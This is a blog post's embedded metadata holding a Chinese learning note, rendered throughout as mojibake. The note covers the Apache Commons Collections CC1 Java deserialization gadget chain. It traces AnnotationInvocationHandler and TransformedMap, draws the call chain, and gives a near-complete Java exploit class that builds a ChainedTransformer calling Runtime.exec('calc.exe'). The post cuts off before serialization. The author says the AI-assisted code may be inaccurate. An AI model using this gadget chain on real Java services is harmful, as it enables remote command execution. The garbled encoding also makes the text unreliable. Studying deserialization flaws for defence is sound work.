&ldquo;æ¼æ´æœ¬è´¨ï¼šåˆ©ç”¨JDKååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹AnnotationInvocationHandlerçš„å¤„ç†é€»è¾‘ï¼Œç»“åˆApache Commons Collectionsçš„TransformedMapçš„è‡ªåŠ¨è½¬æ¢ç‰¹æ€§ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚&rdquo;'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://ljj1992.fun/posts/"},{"@type":"ListItem","position":2,"name":"CCé“¾è·Ÿè¸ª","item":"http://ljj1992.fun/posts/cc%E9%93%BE%E8%B7%9F%E8%B8%AA/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CCé“¾è·Ÿè¸ª","name":"CCé“¾è·Ÿè¸ª","description":"ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ï¼Œä»è¿™é‡Œå¼€å§‹\u0026hellip; å†™åœ¨å‰é¢ï¼šä¸€ä»½å…³äºCC1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®° åœ¨æ‚¨æ·±å…¥é˜…è¯»æœ¬æ–‡æ¡£ä¹‹å‰ï¼Œç¬”è€…å¸Œæœ›å…ˆåˆ†äº«å‡ ç‚¹è¯´æ˜ï¼š\nè¦å®Œå…¨ç†è§£æœ¬æ–‡æ‰€å‰–æçš„è°ƒç”¨é“¾ï¼Œå»ºè®®æ‚¨å¯¹Javaä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µæœ‰ä¸€å®šäº†è§£ï¼Œä¾‹å¦‚ Map æ¥å£ã€æ³¨è§£ï¼ˆAnnotationï¼‰ã€åå°„ï¼ˆReflectionï¼‰ä»¥åŠ HashMap çš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚å°¤å…¶æ˜¯ï¼Œç†è§£ Map ç»“æ„ä¸Javaæ³¨è§£æœºåˆ¶å¦‚ä½•åœ¨æ­¤åœºæ™¯ä¸‹ååŒå·¥ä½œï¼Œå¹¶æœ€ç»ˆä¸ºä½•ä¼šæˆä¸ºè§¦å‘æ¼æ´çš„å…³é”®ï¼Œæ˜¯æŒæ¡æ•´ä¸ªæ”»å‡»é“¾çš„é‡ä¸­ä¹‹é‡ã€‚\næˆ‘æœ¬äººä¹Ÿæ²¡æœ‰ä»äº‹è¿‡Javaå¼€å‘ï¼Œè¯´å®è¯ä¹Ÿæ˜¯ä¸œä¸€æ¦”å¤´è¥¿ä¸€æ£’å­çš„å­¦ä¹ é›¶æ•£çŸ¥è¯†ï¼Œæœ¬æ–‡å¹¶éåŸåˆ›æ€§çš„æ¼æ´ç ”ç©¶ï¼Œå…¶å†…å®¹æ˜¯åœ¨å®‰å…¨é¢†åŸŸå‰è¾ˆä»¬ï¼ˆå¤§ç¥ï¼‰å·²ç»å®Œæ•´æ¢³ç†å‡ºæ”»å‡»é“¾çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¹¶å€ŸåŠ©AIè¾…åŠ©å­¦ä¹ å’Œåˆ†æ(æºç ä¸èƒ½ç¡®ä¿ç™¾åˆ†ç™¾çœŸå®ï¼Œä½†æ˜¯é€»è¾‘ç»è¿‡æˆ‘ç¡®è®¤åº”è¯¥æ²¡é—®é¢˜çš„)ï¼Œå°†æ•´ä¸ªè°ƒç”¨æµç¨‹ä¸€æ­¥æ­¥è·Ÿè¸ªä¸‹æ¥ï¼Œæ—¨åœ¨ç†æ¸…æ¯ä¸€ç¯èŠ‚çš„æ‰§è¡Œé€»è¾‘ä¸å†…åœ¨è”ç³»ã€‚\nå› æ­¤ï¼Œè¿™æ›´åƒæ˜¯ä¸€ç¯‡è¯¦ç»†çš„å­¦ä¹ ç¬”è®°å’Œæ€è€ƒè¿‡ç¨‹çš„è®°å½•ã€‚å¸Œæœ›èƒ½å¯¹åŒæ ·åœ¨å­¦ä¹ è·¯ä¸Šçš„æœ‹å‹ä»¬æœ‰æ‰€å¯å‘ï¼Œæ–‡ä¸­è‹¥æœ‰ä»»ä½•ç–æ¼æˆ–ä¸å½“ä¹‹å¤„ï¼Œä¹Ÿæ³è¯·å„ä½ä¸åèµæ•™ã€‚\nä¸€ã€æ ¸å¿ƒæ€æƒ³æ¦‚è¿° \u0026ldquo;âš ï¸ æœ¬æµ‹è¯•æ–¹æ¡ˆä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ç›®çš„ã€‚ä»»ä½•æœªç»æˆæƒçš„åˆ©ç”¨è¡Œä¸ºå‡è¿åæ³•å¾‹ï¼Œè¯·åŠ¡å¿…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚\u0026rdquo;\nç›®æ ‡ï¼šé€šè¿‡AnnotationInvocationHandlerå’ŒTransformedMapæ„é€ æ¶æ„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\nâœï¸æ ¸å¿ƒé€»è¾‘ï¼š æ”»å‡»è€…ä½¿ç”¨ TransformedMap.decorate() æ–¹æ³•ï¼Œå°†ä¸€ä¸ªåŒ…å«æ¶æ„ ChainedTransformer é“¾çš„ valueTransformer ç»‘å®šåˆ°ä¸€ä¸ªæ™®é€šçš„ HashMap ä¸Šï¼Œæ„é€ å‡ºå…·æœ‰è‡ªåŠ¨è½¬æ¢èƒ½åŠ›çš„æ¶æ„ TransformedMapã€‚ è¯¥ ChainedTransformer é“¾è¢«ç²¾å¿ƒè®¾è®¡ä¸ºä¾æ¬¡æ‰§è¡Œï¼šè·å– Runtime.class â†’ åå°„è°ƒç”¨ getRuntime() â†’ è·å– Runtime å®ä¾‹ â†’ è°ƒç”¨ exec(\u0026quot;calc\u0026quot;)ï¼Œä»è€Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ æ”»å‡»è€…é€šè¿‡åå°„åˆ›å»º AnnotationInvocationHandler å®ä¾‹ï¼Œå¹¶å°†ä¸Šè¿°æ¶æ„ TransformedMap ä½œä¸ºå…¶ memberValues å­—æ®µçš„å€¼ï¼Œä½¿è¯¥ handler åœ¨è¯­ä¹‰ä¸Šâ€œçœ‹èµ·æ¥åƒâ€ä¸€ä¸ªåˆæ³•çš„æ³¨è§£ä»£ç†å¯¹è±¡ã€‚ æ”»å‡»è€…å°†æ•´ä¸ª AnnotationInvocationHandler å¯¹è±¡åºåˆ—åŒ–ï¼Œç”Ÿæˆå¯ä¼ è¾“çš„ payloadï¼Œå¹¶å‘é€ç»™å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç›®æ ‡æœåŠ¡ã€‚ ç›®æ ‡æœåŠ¡åœ¨ååºåˆ—åŒ–è¯¥ payload æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ AnnotationInvocationHandler.readObject() æ–¹æ³•ï¼›è¯¥æ–¹æ³•ä¼šéå† memberValues.entrySet()ï¼Œå¹¶å¯¹æ¯ä¸ªæ¡ç›®è¿›è¡Œç±»å‹æ ¡éªŒã€‚ åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒAnnotationInvocationHandler.readObject()ä¼šéå†memberValuesçš„é”®å€¼å¯¹ã€‚å½“å®ƒå°è¯•å°†memberValuesä¸­çš„å€¼è½¬æ¢ä¸ºæ³¨è§£å®šä¹‰çš„ç±»å‹æ—¶ï¼Œå¦‚æœç±»å‹ä¸åŒ¹é…ï¼ˆå¦‚Stringè¢«è½¬æ¢ä¸ºIntegerï¼‰ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨entry.setValue(newValue)ï¼Œæ¥æ›´æ–°å€¼ï¼Œå³ä½¿æ–°æ—§å€¼ç›¸åŒã€‚è¿™ä¸ªåŠ¨ä½œæ°å¥½è§¦å‘äº†æˆ‘ä»¬é¢„è®¾çš„é™·é˜±ã€‚ ğŸ’¡ä¸æ‡‚çš„å¼ºçƒˆå»ºè®®å­¦ä¸‹Mapå’Œæ³¨è§£æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå…¶å®æœ€ç»ˆç›®çš„å°±æ˜¯ä¸ºäº†è§£è€¦ï¼Œæœ¬äººä¹Ÿæ˜¯Javaå°ç™½ è€Œ TransformedMap é‡å†™äº† entrySet()ï¼Œè¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„ EntrySetViewï¼›å…¶è¿­ä»£å™¨ TransformedMapEntryIterator ä¼šå°†åŸå§‹ Map.Entry åŒ…è£…ä¸º TransformedMapEntryï¼Œå¹¶åœ¨æ„é€ æ—¶ä¿å­˜å¯¹ TransformedMap è‡ªèº«ï¼ˆå³ parentï¼‰çš„å¼•ç”¨ã€‚ å› æ­¤ï¼Œe.setValue(newValue) å®é™…è°ƒç”¨çš„æ˜¯ TransformedMapEntry.setValue()ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨ parent.checkSetValue(value)ï¼Œè¿›è€Œè§¦å‘ valueTransformer.transform(value)ã€‚ æœ€ç»ˆï¼Œç»‘å®šåœ¨ TransformedMap ä¸­çš„ ChainedTransformer é“¾è¢«æ‰§è¡Œï¼Œå®Œæˆ Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;) çš„è°ƒç”¨ï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚ ğŸ“ æ¼æ´åŸç†\u0026quot;å°ç»“ \u0026ldquo;æ¼æ´æœ¬è´¨ï¼šåˆ©ç”¨JDKååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹AnnotationInvocationHandlerçš„å¤„ç†é€»è¾‘ï¼Œç»“åˆApache Commons Collectionsçš„TransformedMapçš„è‡ªåŠ¨è½¬æ¢ç‰¹æ€§ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚\u0026rdquo;\n","keywords":["ç½‘ç»œå®‰å…¨","æ¼æ´","æ”»å‡»é“¾"],"articleBody":"ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ï¼Œä»è¿™é‡Œå¼€å§‹â€¦ å†™åœ¨å‰é¢ï¼šä¸€ä»½å…³äºCC1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®° åœ¨æ‚¨æ·±å…¥é˜…è¯»æœ¬æ–‡æ¡£ä¹‹å‰ï¼Œç¬”è€…å¸Œæœ›å…ˆåˆ†äº«å‡ ç‚¹è¯´æ˜ï¼š\nè¦å®Œå…¨ç†è§£æœ¬æ–‡æ‰€å‰–æçš„è°ƒç”¨é“¾ï¼Œå»ºè®®æ‚¨å¯¹Javaä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µæœ‰ä¸€å®šäº†è§£ï¼Œä¾‹å¦‚ Map æ¥å£ã€æ³¨è§£ï¼ˆAnnotationï¼‰ã€åå°„ï¼ˆReflectionï¼‰ä»¥åŠ HashMap çš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚å°¤å…¶æ˜¯ï¼Œç†è§£ Map ç»“æ„ä¸Javaæ³¨è§£æœºåˆ¶å¦‚ä½•åœ¨æ­¤åœºæ™¯ä¸‹ååŒå·¥ä½œï¼Œå¹¶æœ€ç»ˆä¸ºä½•ä¼šæˆä¸ºè§¦å‘æ¼æ´çš„å…³é”®ï¼Œæ˜¯æŒæ¡æ•´ä¸ªæ”»å‡»é“¾çš„é‡ä¸­ä¹‹é‡ã€‚\næˆ‘æœ¬äººä¹Ÿæ²¡æœ‰ä»äº‹è¿‡Javaå¼€å‘ï¼Œè¯´å®è¯ä¹Ÿæ˜¯ä¸œä¸€æ¦”å¤´è¥¿ä¸€æ£’å­çš„å­¦ä¹ é›¶æ•£çŸ¥è¯†ï¼Œæœ¬æ–‡å¹¶éåŸåˆ›æ€§çš„æ¼æ´ç ”ç©¶ï¼Œå…¶å†…å®¹æ˜¯åœ¨å®‰å…¨é¢†åŸŸå‰è¾ˆä»¬ï¼ˆå¤§ç¥ï¼‰å·²ç»å®Œæ•´æ¢³ç†å‡ºæ”»å‡»é“¾çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¹¶å€ŸåŠ©AIè¾…åŠ©å­¦ä¹ å’Œåˆ†æ(æºç ä¸èƒ½ç¡®ä¿ç™¾åˆ†ç™¾çœŸå®ï¼Œä½†æ˜¯é€»è¾‘ç»è¿‡æˆ‘ç¡®è®¤åº”è¯¥æ²¡é—®é¢˜çš„)ï¼Œå°†æ•´ä¸ªè°ƒç”¨æµç¨‹ä¸€æ­¥æ­¥è·Ÿè¸ªä¸‹æ¥ï¼Œæ—¨åœ¨ç†æ¸…æ¯ä¸€ç¯èŠ‚çš„æ‰§è¡Œé€»è¾‘ä¸å†…åœ¨è”ç³»ã€‚\nå› æ­¤ï¼Œè¿™æ›´åƒæ˜¯ä¸€ç¯‡è¯¦ç»†çš„å­¦ä¹ ç¬”è®°å’Œæ€è€ƒè¿‡ç¨‹çš„è®°å½•ã€‚å¸Œæœ›èƒ½å¯¹åŒæ ·åœ¨å­¦ä¹ è·¯ä¸Šçš„æœ‹å‹ä»¬æœ‰æ‰€å¯å‘ï¼Œæ–‡ä¸­è‹¥æœ‰ä»»ä½•ç–æ¼æˆ–ä¸å½“ä¹‹å¤„ï¼Œä¹Ÿæ³è¯·å„ä½ä¸åèµæ•™ã€‚\nä¸€ã€æ ¸å¿ƒæ€æƒ³æ¦‚è¿° â€œâš ï¸ æœ¬æµ‹è¯•æ–¹æ¡ˆä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ç›®çš„ã€‚ä»»ä½•æœªç»æˆæƒçš„åˆ©ç”¨è¡Œä¸ºå‡è¿åæ³•å¾‹ï¼Œè¯·åŠ¡å¿…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚â€\nç›®æ ‡ï¼šé€šè¿‡AnnotationInvocationHandlerå’ŒTransformedMapæ„é€ æ¶æ„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\nâœï¸æ ¸å¿ƒé€»è¾‘ï¼š æ”»å‡»è€…ä½¿ç”¨ TransformedMap.decorate() æ–¹æ³•ï¼Œå°†ä¸€ä¸ªåŒ…å«æ¶æ„ ChainedTransformer é“¾çš„ valueTransformer ç»‘å®šåˆ°ä¸€ä¸ªæ™®é€šçš„ HashMap ä¸Šï¼Œæ„é€ å‡ºå…·æœ‰è‡ªåŠ¨è½¬æ¢èƒ½åŠ›çš„æ¶æ„ TransformedMapã€‚ è¯¥ ChainedTransformer é“¾è¢«ç²¾å¿ƒè®¾è®¡ä¸ºä¾æ¬¡æ‰§è¡Œï¼šè·å– Runtime.class â†’ åå°„è°ƒç”¨ getRuntime() â†’ è·å– Runtime å®ä¾‹ â†’ è°ƒç”¨ exec(\"calc\")ï¼Œä»è€Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ æ”»å‡»è€…é€šè¿‡åå°„åˆ›å»º AnnotationInvocationHandler å®ä¾‹ï¼Œå¹¶å°†ä¸Šè¿°æ¶æ„ TransformedMap ä½œä¸ºå…¶ memberValues å­—æ®µçš„å€¼ï¼Œä½¿è¯¥ handler åœ¨è¯­ä¹‰ä¸Šâ€œçœ‹èµ·æ¥åƒâ€ä¸€ä¸ªåˆæ³•çš„æ³¨è§£ä»£ç†å¯¹è±¡ã€‚ æ”»å‡»è€…å°†æ•´ä¸ª AnnotationInvocationHandler å¯¹è±¡åºåˆ—åŒ–ï¼Œç”Ÿæˆå¯ä¼ è¾“çš„ payloadï¼Œå¹¶å‘é€ç»™å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç›®æ ‡æœåŠ¡ã€‚ ç›®æ ‡æœåŠ¡åœ¨ååºåˆ—åŒ–è¯¥ payload æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ AnnotationInvocationHandler.readObject() æ–¹æ³•ï¼›è¯¥æ–¹æ³•ä¼šéå† memberValues.entrySet()ï¼Œå¹¶å¯¹æ¯ä¸ªæ¡ç›®è¿›è¡Œç±»å‹æ ¡éªŒã€‚ åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒAnnotationInvocationHandler.readObject()ä¼šéå†memberValuesçš„é”®å€¼å¯¹ã€‚å½“å®ƒå°è¯•å°†memberValuesä¸­çš„å€¼è½¬æ¢ä¸ºæ³¨è§£å®šä¹‰çš„ç±»å‹æ—¶ï¼Œå¦‚æœç±»å‹ä¸åŒ¹é…ï¼ˆå¦‚Stringè¢«è½¬æ¢ä¸ºIntegerï¼‰ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨entry.setValue(newValue)ï¼Œæ¥æ›´æ–°å€¼ï¼Œå³ä½¿æ–°æ—§å€¼ç›¸åŒã€‚è¿™ä¸ªåŠ¨ä½œæ°å¥½è§¦å‘äº†æˆ‘ä»¬é¢„è®¾çš„é™·é˜±ã€‚ ğŸ’¡ä¸æ‡‚çš„å¼ºçƒˆå»ºè®®å­¦ä¸‹Mapå’Œæ³¨è§£æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå…¶å®æœ€ç»ˆç›®çš„å°±æ˜¯ä¸ºäº†è§£è€¦ï¼Œæœ¬äººä¹Ÿæ˜¯Javaå°ç™½ è€Œ TransformedMap é‡å†™äº† entrySet()ï¼Œè¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„ EntrySetViewï¼›å…¶è¿­ä»£å™¨ TransformedMapEntryIterator ä¼šå°†åŸå§‹ Map.Entry åŒ…è£…ä¸º TransformedMapEntryï¼Œå¹¶åœ¨æ„é€ æ—¶ä¿å­˜å¯¹ TransformedMap è‡ªèº«ï¼ˆå³ parentï¼‰çš„å¼•ç”¨ã€‚ å› æ­¤ï¼Œe.setValue(newValue) å®é™…è°ƒç”¨çš„æ˜¯ TransformedMapEntry.setValue()ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨ parent.checkSetValue(value)ï¼Œè¿›è€Œè§¦å‘ valueTransformer.transform(value)ã€‚ æœ€ç»ˆï¼Œç»‘å®šåœ¨ TransformedMap ä¸­çš„ ChainedTransformer é“¾è¢«æ‰§è¡Œï¼Œå®Œæˆ Runtime.getRuntime().exec(\"calc\") çš„è°ƒç”¨ï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚ ğŸ“ æ¼æ´åŸç†\"å°ç»“ â€œæ¼æ´æœ¬è´¨ï¼šåˆ©ç”¨JDKååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹AnnotationInvocationHandlerçš„å¤„ç†é€»è¾‘ï¼Œç»“åˆApache Commons Collectionsçš„TransformedMapçš„è‡ªåŠ¨è½¬æ¢ç‰¹æ€§ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚â€\nğŸ§ªæµ‹è¯•ç¯å¢ƒè¯´æ˜ï¼š å»ºè®®åœ¨æµ‹è¯•æ–¹æ¡ˆå¼€å¤´æ˜ç¡®è¯´æ˜æµ‹è¯•ç¯å¢ƒè¦æ±‚ï¼š\nâ€œæµ‹è¯•ç¯å¢ƒè¦æ±‚ï¼š\næ“ä½œç³»ç»Ÿï¼šWindows 10 / macOS 10.15 / Ubuntu 20.04 JDKç‰ˆæœ¬ï¼šJDK 8u66ï¼ˆæˆ–â‰¤8u71çš„ä»»æ„ç‰ˆæœ¬ï¼‰ ä¾èµ–åº“ï¼šcommons-collections-3.2.1.jarâ€ äºŒã€å®Œæ•´è°ƒç”¨é“¾æµç¨‹å›¾ ois.readObject() â”‚ â””â†’ sun.reflect.annotation.AnnotationInvocationHandler.readObject() â”‚ â””â†’ éå† this.memberValues.entrySet() // memberValues æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ TransformedMap â”‚ â””â†’ for each Map.Entry entry: â”‚ â””â†’ entry.setValue(newValue) â† å› ç±»å‹æ ¡éªŒå¤±è´¥è§¦å‘è‡ªåŠ¨ setValueï¼ˆå³ä½¿ newValue == valueï¼‰ â”‚ â””â†’ org.apache.commons.collections.map.TransformedMap$TransformedMapEntry.setValue(Object) â”‚ â””â†’ this.parent.checkSetValue(value) â† parent = TransformedMap å®ä¾‹ â”‚ â””â†’ TransformedMap.checkSetValue(Object) â”‚ â””â†’ this.valueTransformer.transform(value) â† å³ ChainedTransformer â”‚ â””â†’ org.apache.commons.collections.functors.ChainedTransformer.transform(Object) â”‚ â”œâ†’ ConstantTransformer.transform(_) â†’ returns Runtime.class â”œâ†’ InvokerTransformer(\"getMethod\", [\"getRuntime\", []]).transform(Runtime.class) â”‚ â””â†’ Runtime.class.getMethod(\"getRuntime\") â”œâ†’ InvokerTransformer(\"invoke\", [null, []]).transform(Method) â”‚ â””â†’ Method.invoke(null) â†’ returns Runtime.getRuntime() â””â†’ InvokerTransformer(\"exec\", [\"calc.exe\"]).transform(Runtime) â””â†’ Runtime.exec(\"calc.exe\") ğŸ’¥ ä¸‰ã€CC1 åˆ©ç”¨é“¾æ ¸å¿ƒç»„ä»¶è§£æ Apache Commons Collections æä¾›äº†â€œèƒ½åšä»€ä¹ˆâ€ï¼ˆæ‰§è¡Œä»»æ„æ–¹æ³•ï¼‰ï¼Œè€Œ AnnotationInvocationHandler å†³å®šäº†â€œä½•æ—¶åšâ€ï¼ˆåœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è§¦å‘ï¼‰\n3.1 Apache Commons Collections ååºåˆ—åŒ–æ¼æ´ï¼ˆCC1ï¼‰åˆ©ç”¨ä»£ç è¯¦è§£ èƒŒæ™¯è¯´æ˜ï¼šè¿™æ®µä»£ç æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨ Apache Commons Collections åº“ä¸­çš„ TransformedMap å’Œåå°„æœºåˆ¶ï¼Œåœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ï¼ˆä¾‹å¦‚å¼¹å‡º Windows è®¡ç®—å™¨ calc.exeï¼‰ã€‚è¿™æ˜¯ç»å…¸çš„ Java ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-4852ï¼‰ çš„åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ï¼Œç§°ä¸º CommonsCollections1 (CC1) é“¾ã€‚\n// Apache Commons Collections 1 (CC1) ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ¼”ç¤º // âš ï¸ ä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ï¼è¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ // ä¾èµ–ï¼šcommons-collections:commons-collections:3.1 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; // JDK å†…ç½®æ³¨è§£ï¼Œä»…ä½œå ä½ä½¿ç”¨ import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; /** * æ¼æ´åŸç†ç®€è¿°ï¼š * åˆ©ç”¨ Apache Commons Collections ä¸­çš„ TransformedMap + AnnotationInvocationHandlerï¼Œ * åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘æ¶æ„ Transformer é“¾ï¼Œæœ€ç»ˆæ‰§è¡Œä»»æ„å‘½ä»¤ï¼ˆå¦‚ calc.exeï¼‰ã€‚ */ public class CC1_Exploit { public static void main(String[] args) throws Exception { // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” // ç¬¬ä¸€æ­¥ï¼šæ„é€ æ¶æ„çš„ Transformer é“¾ï¼ˆæ ¸å¿ƒæ”»å‡»è½½è·ï¼‰ // ç›®æ ‡ï¼šæ‰§è¡Œ Runtime.getRuntime().exec(\"calc.exe\") // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Transformer[] transformers = new Transformer[]{ // 1. è¿”å›å›ºå®šçš„ Runtime.class å¯¹è±¡ new ConstantTransformer(Runtime.class), // 2. è°ƒç”¨ Runtime.class.getMethod(\"getRuntime\", new Class[0]) // è·å– getRuntime() æ–¹æ³•çš„ Method å¯¹è±¡ new InvokerTransformer( \"getMethod\", new Class[]{String.class, Class[].class}, // getMethod çš„å‚æ•°ç±»å‹ new Object[]{\"getRuntime\", new Class[0]} // å®é™…å‚æ•°ï¼šæ–¹æ³•å + å‚æ•°ç±»å‹æ•°ç»„ ), // 3. è°ƒç”¨ Method.invoke(null, new Object[]{}) // æ‰§è¡Œé™æ€æ–¹æ³• getRuntime()ï¼Œè¿”å› Runtime å®ä¾‹ new InvokerTransformer( \"invoke\", new Class[]{Object.class, Object[].class}, // invoke çš„å‚æ•°ç±»å‹ new Object[]{null, new Object[]{}} // é™æ€æ–¹æ³•è°ƒç”¨ï¼Œreceiver ä¸º null ), // 4. è°ƒç”¨ Runtime.exec(\"calc.exe\")ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼ˆWindowsï¼‰ new InvokerTransformer( \"exec\", new Class[]{String.class}, // exec çš„å‚æ•°ç±»å‹ new Object[]{\"calc.exe\"} // è¦æ‰§è¡Œçš„å‘½ä»¤ ) }; // å°†å¤šä¸ª Transformer ä¸²è”æˆä¸€ä¸ªé“¾å¼å¤„ç†å™¨ Transformer chainedTransformer = new ChainedTransformer(transformers); // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” // ç¬¬äºŒæ­¥ï¼šæ„é€  TransformedMapï¼Œå°†æ¶æ„é“¾ç»‘å®šåˆ° value çš„è½¬æ¢å™¨ä¸Š // å½“ Map çš„ value è¢«è®¿é—®æˆ–ä¿®æ”¹æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘ transformer // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Map\u003cString, Object\u003e innerMap = new HashMap\u003c\u003e(); innerMap.put(\"value\", \"anything\"); // å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ª entryï¼Œå¦åˆ™ä¸ä¼šè§¦å‘è½¬æ¢ // decorate(originalMap, keyTransformer, valueTransformer) // è¿™é‡Œåªå¯¹ value åº”ç”¨æ¶æ„ transformer Map\u003cString, Object\u003e transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer); // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” // ç¬¬ä¸‰æ­¥ï¼šæ„é€  AnnotationInvocationHandler å¯¹è±¡ // è¯¥ç±»åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ Map.entrySet()ï¼Œä»è€Œè§¦å‘ TransformedMap çš„ value è½¬æ¢ // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Class\u003c?\u003e clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor\u003c?\u003e constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // ç»•è¿‡ç§æœ‰æ„é€ å‡½æ•°é™åˆ¶ // åˆ›å»º handler å®ä¾‹ï¼š // - ç¬¬ä¸€ä¸ªå‚æ•°ï¼šä»»æ„æ³¨è§£ç±»ï¼ˆRetention æ˜¯ JDK è‡ªå¸¦çš„ï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼‰ // - ç¬¬äºŒä¸ªå‚æ•°ï¼šæˆ‘ä»¬çš„æ¶æ„ transformedMap Object handler = constructor.newInstance(Retention.class, transformedMap); // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” // 